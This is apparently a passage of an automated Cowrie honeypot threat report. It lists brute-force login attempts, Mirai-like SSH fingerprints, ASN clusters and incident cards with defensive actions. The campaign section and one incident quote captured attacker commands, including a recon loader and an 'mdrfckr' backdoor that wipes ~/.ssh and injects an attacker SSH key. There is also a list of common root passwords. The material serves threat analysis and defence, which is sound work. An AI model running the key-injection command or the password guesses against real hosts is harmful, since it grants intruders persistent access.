| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-10T04:24:09 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-10T04:24:09 |
| `root` | `123456789` | `92.118.39.14` | 2026-08-10T04:24:09 |
| `root` | `1234567890` | `92.118.39.14` | 2026-08-10T04:26:31 |
| `root` | `123abc` | `92.118.39.14` | 2026-08-10T04:28:47 |
| `root` | `1q2w3e4r` | `92.118.39.14` | 2026-08-10T04:31:11 |
| `root` | `2020` | `211.253.10.61` | 2026-08-10T04:33:13 |
| `root` | `2020` | `187.126.105.42` | 2026-08-10T04:33:22 |
| `root` | `P@ssw0rd123` | `92.118.39.14` | 2026-08-10T04:33:33 |
| `root` | `123abc` | `185.40.122.250` | 2026-08-10T04:35:27 |
| `root` | `123abc` | `178.178.194.123` | 2026-08-10T04:35:38 |
| `root` | `abc123` | `92.118.39.14` | 2026-08-10T04:35:55 |
| `root` | `admin123` | `92.118.39.14` | 2026-08-10T04:38:15 |
| `nobody` | `123456789` | `10.0.0.73` | 2026-08-10T04:38:50 |
| `root` | `letmein` | `92.118.39.14` | 2026-08-10T04:40:39 |
| `root` | `pass123` | `92.118.39.14` | 2026-08-10T04:43:02 |
| `root` | `2020` | `10.0.0.73` | 2026-08-10T04:44:57 |
| `root` | `password` | `92.118.39.14` | 2026-08-10T04:45:18 |
| `root` | `password1` | `92.118.39.14` | 2026-08-10T04:47:38 |
| `root` | `qwerty123` | `92.118.39.14` | 2026-08-10T04:49:56 |
| `root` | `root123` | `92.118.39.14` | 2026-08-10T04:52:16 |
| `root` | `welcome` | `92.118.39.14` | 2026-08-10T04:54:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **354** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 41 |
| Go SSH scanner | 31 |
| libssh | 21 |
| Paramiko (Python) | 14 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 38 | 38 |
| `2ec37a7cc8da...` | Mirai/variant | 20 | 1 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `f555226df196...` | Mirai/variant | 8 | 3 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 38 | 38 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 20 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 2 | — |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 8 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `9052c4ab4164...` | OpenSSH | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 19 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.6.234.27`, `92.62.233.214`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **146** |
| Unique ASNs | **100** |
| High-Risk ASNs | **69** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 9 | MEDIUM |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS31898` | Oracle Corporation | 5 | HIGH |
| `AS48721` | Flyservers S.A. | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (94)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6866b01dd2ff

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]50` |
| **First Seen** | 2026-08-10 01:02 |
| **Last Seen** | 2026-08-10 01:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:02:47` | `cowrie.session.connect` |
| `2026-08-10 01:02:48` | `cowrie.client.version` |
| `2026-08-10 01:02:48` | `cowrie.client.kex` |
| `2026-08-10 01:02:49` | `cowrie.login.success` |
| `2026-08-10 01:02:49` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]50` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f373216cbb

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-08-10 01:02 |
| **Last Seen** | 2026-08-10 01:07 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:02:54` | `cowrie.session.connect` |
| `2026-08-10 01:02:54` | `cowrie.client.version` |
| `2026-08-10 01:02:54` | `cowrie.client.kex` |
| `2026-08-10 01:02:56` | `cowrie.login.success` |
| `2026-08-10 01:02:56` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f04407f5019f

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-08-10 01:08 |
| **Last Seen** | 2026-08-10 01:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:08:02` | `cowrie.session.connect` |
| `2026-08-10 01:08:02` | `cowrie.client.version` |
| `2026-08-10 01:08:02` | `cowrie.client.kex` |
| `2026-08-10 01:08:03` | `cowrie.login.success` |
| `2026-08-10 01:08:03` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694fb4ec3c9a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]11` |
| **First Seen** | 2026-08-10 01:10 |
| **Last Seen** | 2026-08-10 01:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:10:06` | `cowrie.session.connect` |
| `2026-08-10 01:10:07` | `cowrie.client.version` |
| `2026-08-10 01:10:07` | `cowrie.client.kex` |
| `2026-08-10 01:10:09` | `cowrie.login.success` |
| `2026-08-10 01:10:10` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]11` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8d9a70588c

| Field | Detail |
|---|---|
| **Source IP** | `220.90.220[.]204` |
| **First Seen** | 2026-08-10 01:25 |
| **Last Seen** | 2026-08-10 01:26 |
| **Session Duration** | 42s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:25:55` | `cowrie.session.connect` |
| `2026-08-10 01:25:55` | `cowrie.client.version` |
| `2026-08-10 01:25:55` | `cowrie.client.kex` |
| `2026-08-10 01:25:56` | `cowrie.login.failed` |
| `2026-08-10 01:25:57` | `cowrie.login.success` |
| `2026-08-10 01:25:59` | `cowrie.session.params` |
| `2026-08-10 01:25:59` | `cowrie.command.input` |
| `2026-08-10 01:25:59` | `cowrie.command.failed` |
| `2026-08-10 01:25:59` | `cowrie.log.closed` |
| `2026-08-10 01:26:00` | `cowrie.session.params` |
| `2026-08-10 01:26:00` | `cowrie.command.input` |
| `2026-08-10 01:26:00` | `cowrie.log.closed` |
| `2026-08-10 01:26:01` | `cowrie.session.params` |
| `2026-08-10 01:26:01` | `cowrie.command.input` |
| `2026-08-10 01:26:01` | `cowrie.log.closed` |
| `2026-08-10 01:26:02` | `cowrie.session.params` |
| `2026-08-10 01:26:02` | `cowrie.command.input` |
| `2026-08-10 01:26:02` | `cowrie.log.closed` |
| `2026-08-10 01:26:03` | `cowrie.session.params` |
| `2026-08-10 01:26:03` | `cowrie.command.input` |
| `2026-08-10 01:26:04` | `cowrie.log.closed` |
| `2026-08-10 01:26:05` | `cowrie.session.params` |
| `2026-08-10 01:26:05` | `cowrie.command.input` |
| `2026-08-10 01:26:05` | `cowrie.log.closed` |
| `2026-08-10 01:26:06` | `cowrie.session.params` |
| `2026-08-10 01:26:06` | `cowrie.command.input` |
| `2026-08-10 01:26:06` | `cowrie.log.closed` |
| `2026-08-10 01:26:07` | `cowrie.session.params` |
| `2026-08-10 01:26:07` | `cowrie.command.input` |
| `2026-08-10 01:26:07` | `cowrie.log.closed` |
| `2026-08-10 01:26:08` | `cowrie.session.params` |
| `2026-08-10 01:26:08` | `cowrie.command.input` |
| `2026-08-10 01:26:09` | `cowrie.log.closed` |
| `2026-08-10 01:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.90.220[.]204` to AbuseIPDB if not already reported
- [ ] Block `220.90.220[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-346f2680f05c

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-08-10 01:26 |
| **Last Seen** | 2026-08-10 01:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:26:17` | `cowrie.session.connect` |
| `2026-08-10 01:26:18` | `cowrie.client.version` |
| `2026-08-10 01:26:18` | `cowrie.client.kex` |
| `2026-08-10 01:26:20` | `cowrie.login.success` |
| `2026-08-10 01:26:21` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-939f6038de2f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 01:31 |
| **Last Seen** | 2026-08-10 01:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:31:44` | `cowrie.session.connect` |
| `2026-08-10 01:31:44` | `cowrie.client.version` |
| `2026-08-10 01:31:44` | `cowrie.client.kex` |
| `2026-08-10 01:31:44` | `cowrie.login.success` |
| `2026-08-10 01:31:45` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:31:45` | `cowrie.direct-tcpip.data` |
| `2026-08-10 01:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67ccddac9435

| Field | Detail |
|---|---|
| **Source IP** | `121.202.138[.]181` |
| **First Seen** | 2026-08-10 01:37 |
| **Last Seen** | 2026-08-10 01:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:37:00` | `cowrie.session.connect` |
| `2026-08-10 01:37:01` | `cowrie.client.version` |
| `2026-08-10 01:37:01` | `cowrie.client.kex` |
| `2026-08-10 01:37:06` | `cowrie.login.success` |
| `2026-08-10 01:37:07` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.138[.]181` to AbuseIPDB if not already reported
- [ ] Block `121.202.138[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb71f9132a7

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-10 01:37 |
| **Last Seen** | 2026-08-10 01:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:37:13` | `cowrie.session.connect` |
| `2026-08-10 01:37:13` | `cowrie.client.version` |
| `2026-08-10 01:37:13` | `cowrie.client.kex` |
| `2026-08-10 01:37:14` | `cowrie.login.success` |
| `2026-08-10 01:37:15` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10334914cab1

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-08-10 01:42 |
| **Last Seen** | 2026-08-10 01:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:42:13` | `cowrie.session.connect` |
| `2026-08-10 01:42:14` | `cowrie.client.version` |
| `2026-08-10 01:42:14` | `cowrie.client.kex` |
| `2026-08-10 01:42:16` | `cowrie.login.success` |
| `2026-08-10 01:42:16` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4009069ee84a

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-08-10 01:42 |
| **Last Seen** | 2026-08-10 01:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:42:21` | `cowrie.session.connect` |
| `2026-08-10 01:42:22` | `cowrie.client.version` |
| `2026-08-10 01:42:22` | `cowrie.client.kex` |
| `2026-08-10 01:42:24` | `cowrie.login.success` |
| `2026-08-10 01:42:25` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35eb4903906a

| Field | Detail |
|---|---|
| **Source IP** | `117.191.83[.]250` |
| **First Seen** | 2026-08-10 01:44 |
| **Last Seen** | 2026-08-10 01:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:44:22` | `cowrie.session.connect` |
| `2026-08-10 01:44:23` | `cowrie.client.version` |
| `2026-08-10 01:44:23` | `cowrie.client.kex` |
| `2026-08-10 01:44:25` | `cowrie.login.success` |
| `2026-08-10 01:44:26` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.191.83[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.191.83[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-103a3d4b32d7

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-10 01:44 |
| **Last Seen** | 2026-08-10 01:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:44:36` | `cowrie.session.connect` |
| `2026-08-10 01:44:36` | `cowrie.client.version` |
| `2026-08-10 01:44:36` | `cowrie.client.kex` |
| `2026-08-10 01:44:37` | `cowrie.login.success` |
| `2026-08-10 01:44:38` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e4a89cfa9c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 01:54 |
| **Last Seen** | 2026-08-10 01:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:54:09` | `cowrie.session.connect` |
| `2026-08-10 01:54:09` | `cowrie.client.version` |
| `2026-08-10 01:54:09` | `cowrie.client.kex` |
| `2026-08-10 01:54:09` | `cowrie.login.success` |
| `2026-08-10 01:54:10` | `cowrie.direct-tcpip.request` |
| `2026-08-10 01:54:10` | `cowrie.direct-tcpip.data` |
| `2026-08-10 01:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf0f4670500

| Field | Detail |
|---|---|
| **Source IP** | `92.62.233[.]214` |
| **First Seen** | 2026-08-10 01:56 |
| **Last Seen** | 2026-08-10 01:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:56:27` | `cowrie.session.connect` |
| `2026-08-10 01:56:27` | `cowrie.client.version` |
| `2026-08-10 01:56:27` | `cowrie.client.kex` |
| `2026-08-10 01:56:27` | `cowrie.login.success` |
| `2026-08-10 01:56:28` | `cowrie.session.params` |
| `2026-08-10 01:56:28` | `cowrie.command.input` |
| `2026-08-10 01:56:28` | `cowrie.command.failed` |
| `2026-08-10 01:56:29` | `cowrie.log.closed` |
| `2026-08-10 01:56:29` | `cowrie.session.params` |
| `2026-08-10 01:56:29` | `cowrie.command.input` |
| `2026-08-10 01:56:29` | `cowrie.session.file_download` |
| `2026-08-10 01:56:29` | `cowrie.log.closed` |
| `2026-08-10 01:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.233[.]214` to AbuseIPDB if not already reported
- [ ] Block `92.62.233[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39140ae7bdf

| Field | Detail |
|---|---|
| **Source IP** | `92.62.233[.]214` |
| **First Seen** | 2026-08-10 01:56 |
| **Last Seen** | 2026-08-10 01:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:56:29` | `cowrie.session.connect` |
| `2026-08-10 01:56:29` | `cowrie.client.version` |
| `2026-08-10 01:56:29` | `cowrie.client.kex` |
| `2026-08-10 01:56:30` | `cowrie.login.success` |
| `2026-08-10 01:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.233[.]214` to AbuseIPDB if not already reported
- [ ] Block `92.62.233[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8003537d635f

| Field | Detail |
|---|---|
| **Source IP** | `92.62.233[.]214` |
| **First Seen** | 2026-08-10 01:56 |
| **Last Seen** | 2026-08-10 01:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 01:56:30` | `cowrie.session.connect` |
| `2026-08-10 01:56:30` | `cowrie.client.version` |
| `2026-08-10 01:56:30` | `cowrie.client.kex` |
| `2026-08-10 01:56:31` | `cowrie.login.success` |
| `2026-08-10 01:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.233[.]214` to AbuseIPDB if not already reported
- [ ] Block `92.62.233[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffdcc4de2fc

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-10 02:00 |
| **Last Seen** | 2026-08-10 02:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 02:00:39` | `cowrie.session.connect` |
| `2026-08-10 02:00:39` | `cowrie.client.version` |
| `2026-08-10 02:00:39` | `cowrie.client.kex` |
| `2026-08-10 02:00:43` | `cowrie.login.success` |
| `2026-08-10 02:00:43` | `cowrie.direct-tcpip.request` |
